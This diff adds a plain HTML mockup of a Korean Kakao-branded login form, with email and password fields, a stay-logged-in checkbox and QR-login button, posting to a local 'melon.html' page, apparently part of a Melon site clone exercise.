@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>카카오톡으로 로그인</title>
+ 
+</head>
+<body>
+    <h2>kakao</h2>
+    <form action="melon.html" method="POST">
+        <div class="input-group">
+            <label for="email">이메일 또는 전화번호</label>
+            <input type="text" id="email" name="email" placeholder="카카오메일 아이디, 이메일, 전화번호" required>
+        </div>
+
+        <div class="input-group">
+            <label for="password">비밀번호</label>
+            <input type="password" id="password" name="password" placeholder="비밀번호" required>
+        </div>
+
+        <div class="options">
+            <input type="checkbox" id="stay-logged-in" name="login" value="로그인 유지">
+            <label for="stay-logged-in">로그인 유지</label>
+        </div>
+
+        <div class="buttons">
+            <button type="submit" class="login-btn">로그인</button>
+            <button type="button" class="qr-btn">QR코드 로그인</button>
+        </div>
+
+      </form>
+</body>
